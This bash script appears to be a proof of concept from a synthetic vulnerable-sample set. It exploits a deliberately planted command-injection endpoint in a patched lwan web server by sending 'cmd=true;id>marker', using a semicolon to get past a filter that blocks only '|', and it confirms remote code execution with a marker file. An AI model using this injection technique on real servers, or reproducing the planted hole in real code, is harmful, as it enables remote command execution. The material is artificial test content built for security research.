#!/usr/bin/env bash
# PoC for 081_lwan_C3I3S2
# Axes: C3 (three flags + utility fn) / I3 (struct dispatch) / S2 (block '|', bypass ';')
#
# The vulnerability: cmd is dispatched via a function pointer table to system().
# S2 blocks '|' but allows ';', which chains commands.
#
# The patched binary (lwan) lives in this directory. If absent, run build.sh.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_081_www"
MARKER="/tmp/poc_081_marker"
PORT=18081
NEG_PORT=19081

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        # also kill worker threads that survive the main process
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    # release port in case worker threads still hold it
    fuser -k 18081/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# start server ───────────────────────────────────────────────────────────────────
echo "[*] starting lwan with --exec-mode on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-mode &
SERVER_PID=$!
sleep 1.0

# # trigger: with semicolon (S2 bypass) ─────────────────────────────────────────────────────
echo "[*] sending payload (with semicolon (S2 bypass)): cmd=true;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?verb=run&cmd=true;id>${MARKER}" > /dev/null || true

sleep 0.3

# verify ─────────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# negative control: endpoint absent without --exec-mode ──────────────────────────
echo "[*] verifying gate: endpoint must return 404 without --exec-mode..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k 18081/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?verb=run&cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k 19081/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
